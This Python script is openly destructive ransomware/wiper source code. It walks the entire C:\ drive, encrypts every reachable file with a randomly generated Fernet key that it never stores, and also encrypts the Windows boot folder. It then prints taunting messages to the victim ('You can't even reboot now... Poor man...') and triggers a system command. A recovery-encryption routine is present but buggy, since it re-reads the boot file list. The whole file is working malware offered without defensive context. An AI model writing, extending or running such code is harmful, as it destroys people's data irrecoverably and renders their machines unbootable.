import os
import sys
import subprocess
import time
import ctypes
from cryptography.fernet import Fernet
import traceback
from datetime import datetime

files = []
drv_nt = "C:/"
path = "C:/thekey.key"
excluded_dirs = ["Windows", "System Volume Information"]
log_path = "C:/log.enclog"
file_path = ""
enc_count = 0
boot_path = "C:/Windows/Boot"
recovery = "C:/Recovery"
boot = []
rec = []
key = Fernet.generate_key()
def log_exception(e):

    with open(log_path, "a") as f:
        f.write(f"{datetime.now()} - Exception: {e}\n")
        f.write(traceback.format_exc())
        f.write("\n")

def prc_nt():
    global files
    for root, dirs, filenames in os.walk(drv_nt):    
        dirs[:] = [d for d in dirs if d not in excluded_dirs]
        for file in filenames:
            try:
                if file == "sth.py" or file == "key.sth":
                    continue
                file_path = os.path.join(root, file)
                files.append(file_path)
            except Exception:
                continue
    global key
    global enc_count
    for target_path in files:  
        try:
            with open(target_path, "rb") as thefile:
                contents = thefile.read()
            contents_encrypted = Fernet(key).encrypt(contents)
            with open(target_path, "wb") as thefile:  
                thefile.write(contents_encrypted)
            enc_count += 1
        except (PermissionError, IsADirectoryError, OSError) as e:
            log_exception(e)   
def spawn_console():
    subprocess.Popen(
        [sys.executable, "--console"],
        creationflags=subprocess.CREATE_NEW_CONSOLE
    )
def enc_boot():
    global key
    global boot
    for root, dirs, filenames in os.walk(boot_path):
        for file in filenames:
                file_path = os.path.join(root, file)
                boot.append(file_path)
    for filenames in boot:
        with open(filenames, "rb") as sth:
            boot_cont = sth.read()
        boot_encrp = Fernet(key).encrypt(boot_cont)
        with open(filenames, "wb") as sth:
            sth.write(boot_encrp)
def recovry():
    for root, dirs, filenames in os.walk(recovery):
        for file in filenames:
                file_path = os.path.join(root, file)
                rec.append(file_path)
    for filenames in boot:
        with open(filenames, "rb") as sth:
            rec_cont = sth.read()
        rcvry_encrp = Fernet(key).encrypt(rec_cont)
        with open(filenames, "wb") as sth:
            sth.write(rcvry_encrp)

def console_mode():
    print(f"{enc_count} file(s) are encrypted on C:\\ drive...\n")
    print("You can't even reboot now...\nPoor man...\n")
    print("Before you reboot, I'll reboot the PC for you...\nGoodbye!!!")
    os.system('powershell wininit')

if __name__ == "__main__":
    enc_boot()
    prc_nt()
    spawn_console()
    console_mode()

